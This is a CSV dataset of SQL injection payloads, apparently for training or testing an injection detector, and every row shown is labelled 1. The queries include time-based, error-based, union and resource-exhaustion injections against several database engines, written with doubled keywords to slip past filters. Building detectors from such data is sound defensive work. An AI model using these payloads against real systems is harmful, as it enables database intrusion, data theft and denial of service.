Query,Label
-3582  )   wherwheree 5873  =  5873 oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"1'  )   as fyuh whewherere 7608  =  7608 aandnd 4241  =  convert  (  iinnt,  (  sselectelect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sselectelect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-1269"" ununionion all selselectect 8412,8412,8412,8412,8412,8412,8412,8412--",1
"1' oorr updupdateatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  selselectect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
-4758%'   )    )    oorr 5903  =    (  'qqpjq'||  (  selselectect case 5903 when 5903 then 1 else 0 end frfromom rdb$databdatabasease  )  ||'qzvzq'  )   aandnd    (    (   '%'  =  ',1
"-9891"" uniunionon all selecselectt 7489#",1
1%' ununionion all selselectect nunullll#,1
"-1707  )   oorr 1570  =  convert  (  iinnt,  (  seselectlect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seselectlect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd   (  7756  =  7756",1
"-8981%""   )    )     )   uunionnion all seleselectct 4538,4538,4538,4538,4538,4538,4538#",1
"-3913"" whwhereere 6085  =  6085 uniunionon all sselectelect 6085,6085,6085,6085,6085,6085,6085#",1
"1""  )   wwherehere 3958  =  3958 oorr 6979  =  llikeike  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"-4381 oorr make_ssetet  (  6118  =  3095,3095  )  # lkcr",1
1' rliklikee   (  seselectlect   (  case when   (  5567  =  5586  )   then 1 else 0x28 end   )    )    anandd 'mmnb'  =  'mmnb,1
"-1196""   )    )    oorr 1570  =  convert  (  iinnt,  (  seleselectct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   anandd    (    (   ""srlq""  =  ""srlq",1
1'||  (  selecselectt 'sdll' whwhereere 5074  =  5074 oorr   (  selecselectt * ffromrom   (  selecselectt  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1
"1""   )    )    uniunionon all selecselectt nulnulll,nulnulll,nulnulll#",1
"1""  )   whwhereere 6065  =  6065 aandnd 6510  =    (  selselectect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-4256'  )   wwherehere 9545  =  9545 oorr 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1%""   )    )     )   aandnd 8635  =    (  seleselectct count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
"-7776'  )   oorr 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd   (  'ihof'  =  'ihof",1
1'   )    )    anandd   (  5091  =  8681  )  *8681 anandd    (    (   'xevm'  =  'xevm,1
"1%"" aandnd 6510  =    (  sselectelect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd ""%""  =  """,1
"1%""   )    )     )   anandd 4595  =  4595#",1
"-2102' whewherere 3644  =  3644 oorr 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-7903 wherwheree 6699  =  6699 oorr 8571  =  8571--,1
"sselectelect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1
"-5066'   )    )    uniunionon all seleselectct 9689,9689,9689,9689#",1
"1'||  (  seselectlect 'nfgq' whewherere 1837  =  1837 aandnd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )  --",1
"1""   )    )     )   oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull  )   anandd    (    (     (  ""vfoh""  =  ""vfoh",1
1  )   as ztrb wherwheree 1052  =  1052 anandd   (  seselectlect * frofromm   (  seselectlect  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1%""   )    )     )   uniunionon all selselectect nunullll--",1
"1%'   )    )     )   uniunionon all selselectect nnullull,nnullull,nnullull,nnullull,nnullull#",1
"-4692%""   )    )    ununionion all seselectlect 1781,1781#",1
"1""  )   as xrsi wherwheree 9498  =  9498",1
"1%""   )    )    oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (   ""%""  =  """,1
"1'  )   as myxr whwhereere 6299  =  6299 aandnd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"1'  )   as yhgk wwherehere 9246  =  9246 aandnd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nnullull  )  --",1
"1"" wherwheree 7279  =  7279 oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1%"" anandd elt  (  5345  =  8751,8751  )   anandd ""%""  =  """,1
1   )    )    as xcsm wherwheree 9231  =  9231,1
"1""  )   as vdim whewherere 1296  =  1296",1
"call regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   aandnd    (    (   '%'  =  '",1
"1'  )   as viex whwhereere 6242  =  6242 anandd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"1"" oorr   (  seleselectct * frofromm   (  seleselectct  (  sleep  (  5   )    )     )  ydpu  )  ",1
"1'+  (  sselectelect 'sqje' wwherehere 1634  =  1634 oorr exp  (  ~  (  sselectelect * frofromm   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
"1'   )    )    as uncy wwherehere 8009  =  8009 uniounionn all seselectlect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
1'||  (  seselectlect 'avxz' ffromrom dual wwherehere 7815  =  7815,1
1'||  (  sselectelect 'glyc' ffromrom dual wwherehere 4058  =  4058,1
1   )    )     )   waitfoorr delay '0:0:5' anandd    (    (     (  3481  =  3481,1
"1'||  (  sselectelect 'ssvp' wwherehere 3300  =  3300 oorr 2367  =    (  sselectelect count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'  )   as sjij wherwheree 8659  =  8659,1
1' aandnd 2908  =  8067--,1
"1%'   )    )    aandnd 3202  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (   '%'  =  '",1
"1"" whwhereere 7371  =  7371 waitfoorr delay '0:0:5'--",1
"1""  )   anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seselectlect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anandd   (  ""zyeo"" lilikeke ""zyeo",1
"1%'   )    )    ununionion all sselectelect nnullull,nnullull,nnullull,nnullull--",1
1' iinn boolean mode  )   aandnd 4457  =  3885#,1
"selselectect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    anandd    (    (     (  ""%""  =  """,1
"1"" whwhereere 7879  =  7879",1
"1  )   wwherehere 9687  =  9687 anandd elt  (  9607  =  9432,9432  )  --",1
"1%""   )    )    uniounionn all selecselectt nnullull,nnullull--",1
1%'  )   oorr 4240  =    (  selecselectt 4240 frfromom pg_sleep  (  5   )    )   --,1
"1""   )    )    waitfoorr delay '0:0:5'--",1
"1'  )   as nmzp wwherehere 3794  =  3794 aandnd 6510  =    (  selecselectt count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1  )   whewherere 1880  =  1880 aandnd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1""   )    )    uunionnion all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
if  (  8182  =  3225  )   seleselectct 8182 else drdropop function kpzk--,1
"1  )   anandd   (  selecselectt 9067 ffromrom  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   anandd   (  8529  =  8529",1
1  )   as xtgr whwhereere 1545  =  1545,1
"1%""   )    )     )   oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nunullll  )  --",1
"1""   )    )    as ikuz whewherere 7385  =  7385",1
1 aandnd 6240  =    (  'qqpjq'||  (  seleselectct case 6240 when 6240 then 1 else 0 end frofromm rdb$ddatabaseatabase  )  ||'qzvzq'  )  # twev,1
"-7923""   )    )    oorr make_ssetet  (  9354  =  9354,7185  )   anandd    (    (   ""szct""  =  ""szct",1
"1'  )   as omtb whewherere 1183  =  1183 aandnd 8635  =    (  selselectect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
1'||  (  selecselectt 'czos' ffromrom dual whwhereere 6814  =  6814,1
1'  )   rliklikee   (  selselectect * frofromm   (  selselectect  (  sleep  (  5   )    )     )  sgvo  )   aandnd   (  'lzbn'  =  'lzbn,1
"1""   )    )     )   anandd 5556  =    (  seleselectct count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd    (    (     (  ""sfbc""  =  ""sfbc",1
"1%""  )   oorr 6793  =    (  seselectlect 6793 ffromrom pg_sleep  (  5   )    )    aandnd   (  ""%""  =  """,1
"1' iinn boolean mode  )   aandnd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )  --",1
"-1985%'   )    )     )   uniounionn all selecselectt 3051,3051,3051--",1
"-7661"" ununionion all seselectlect 9551,9551,9551#",1
"1""   )    )     )   anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selselectect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anandd    (    (     (  ""prtf"" llikeike ""prtf",1
"1   )    )    oorr upupdatedatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  sselectelect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   aandnd    (    (   8965  =  8965",1
"1"" aandnd 8407  =    (  seleselectct count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   ",1
"1 oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  ",1
"1%'  )   oorr 2367  =    (  sselectelect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-1031%"" uniounionn all sselectelect 6832,6832,6832,6832#",1
"-9740""   )    )    as pxkx wherwheree 5305  =  5305 oorr 1 group bbyy concat  (  0x7171706a71,  (  seleselectct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"1""   )    )    oorr 6793  =    (  seleselectct 6793 ffromrom pg_sleep  (  5   )    )    aandnd    (    (   ""ejpw""  =  ""ejpw",1
 (  sselectelect   (  case when   (  6714  =  8872  )   then 1 else 6714*  (  sselectelect 6714 frofromm master..sysdatdatabaseabases  )   end   )    ) ,1
"-1084'  )   ununionion all sselectelect 2634,2634,2634,2634,2634,2634,2634,2634#",1
"selselectect * frofromm generate_series  (  1431,1431,case when   (  1431  =  7822  )   then 1 else 0 end  )   lilimitmit 1--",1
-5217 whewherere 3620  =  3620 oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seselectlect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1%' anandd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-4452%"" uunionnion all seselectlect 7141,7141,7141,7141,7141,7141,7141,7141--",1
"1""   )    )    rllikeike sleep  (  5  )  #",1
"1""   )    )    rlilikeke   (  selecselectt   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    aandnd    (    (   ""ladc"" lilikeke ""ladc",1
"1""  )   as hfgk wherwheree 1100  =  1100 oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nunullll  )  --",1
"1%""   )    )    aandnd elt  (  1210  =  1210,sleep  (  5   )    )    aandnd    (    (   ""%""  =  """,1
1'||  (  selecselectt 'bezt' wherwheree 7876  =  7876,1
"1'  )   aandnd 8407  =    (  selecselectt count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   ",1
1  )   as nioj whewherere 9703  =  9703,1
"1""   )    )     )   aandnd   (  7396  =  6351  )  *6351 aandnd    (    (     (  ""xerw"" liklikee ""xerw",1
"1'   )    )     )   anandd 6414  =    (  selecselectt count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   anandd    (    (     (  'qtni'  =  'qtni",1
-7387'   )    )     )   oorroorrderder bbyy 1--,1
"sselectelect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   frfromom dual aandnd    (    (     (  'aatp'  =  'aatp",1
"1%"" anandd elt  (  1210  =  1210,sleep  (  5   )    )    anandd ""%""  =  """,1
"1'   )    )     )   aandnd 3707  =    (  seleselectct count  (  *  )   frfromom sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )   aandnd    (    (     (  'viad' lilikeke 'viad",1
"1  )   aandnd 9660  =    (  seleselectct count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
 (  selselectect * frofromm   (  selselectect  (  sleep  (  5   )    )     )  lrov  ) ,1
"1""  )   as ltbl wwherehere 6395  =  6395",1
1'+  (  sselectelect wpkh wherwheree 5842  =  5842,1
"1'||  (  seleselectct 'ylek' whewherere 3803  =  3803 aandnd 4241  =  convert  (  iinnt,  (  seleselectct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",1
1  )   whewherere 5866  =  5866 aandnd 4595  =  4595#,1
"-2204'||  (  sselectelect 'bwae' frofromm dual wherwheree 4884  =  4884 uunionnion all sselectelect 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",1
"1%""  )   anandd 9764  =  6037 anandd   (  ""%""  =  """,1
1'  )   as qqyz whwhereere 2274  =  2274,1
"1'  )   anandd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nnullull  )   anandd   (  'qutm'  =  'qutm",1
" selselectect sleep  (  5  )   aandnd    (    (   ""%""  =  """,1
"-9808' iinn boolean mode  )   uniunionon all seselectlect 2528,2528,2528,2528,2528,2528,2528--",1
1'   )    )    waitfoorr delay '0:0:5' anandd    (    (   'jcfe'  =  'jcfe,1
"1"" whewherere 7788  =  7788 oorr 4411  =    (  selselectect count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1' whwhereere 4253  =  4253,1
"-8966""   )    )     )   oorr 1628  =  2712",1
"1' uunionnion all seselectlect nunullll,nunullll,nunullll#",1
"1,  (  selselectect   (  case when   (  7734  =  7734  )   then   (  selselectect benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  selselectect 7734 frfromom mysql.db  )   end   )    )   ",1
"1' iinn boolean mode  )   anandd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-5227"" uniunionon all selselectect 2666--",1
"-9176'   )    )    as eunw wwherehere 5978  =  5978 oorr 1 group bbyy concat  (  0x7171706a71,  (  selselectect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"-3074'   )    )    ununionion all selecselectt 6131,6131,6131,6131,6131,6131,6131--",1
1' anandd sleep  (  5  )   anandd 'kapr'  =  'kapr,1
"1%'   )    )     )   aandnd make_sesett  (  8403  =  8403,8899  )   aandnd    (    (     (  '%'  =  '",1
"1  )   wwherehere 6720  =  6720 oorr   (  seleselectct 2*  (  if   (    (   seleselectct * frfromom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
